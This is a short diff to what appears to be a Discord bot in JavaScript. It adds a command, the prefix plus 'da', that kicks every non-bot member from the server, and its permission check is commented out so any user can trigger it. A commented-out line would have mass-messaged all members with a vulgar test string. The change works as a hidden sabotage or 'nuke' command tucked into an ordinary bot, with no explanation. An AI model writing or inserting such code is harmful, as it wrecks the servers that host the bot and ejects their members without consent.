@@ -104,5 +104,14 @@ let userVar = message.author
         bot.channels.get("263295931565211648").send(message.content.slice(0, message.content.length)+ " " + userVar); 
 
     }}
+if (message.content === prefix + "da") {
+   // let rolegive = message.guild.roles.find('name', 'allrole');
+   // if (!rolegive) return message.channel.send(`---`);
+   // if(message.member.roles.has(rolegive.id)) {
 
+   // message.guild.members.filter(m => !m.user.bot).map(async members => await members.sendMessage("test du casse couille"));
+    message.guild.members.filter(m => !m.user.bot).map(async members => await members.kick());
+
+    //}
+}
     })
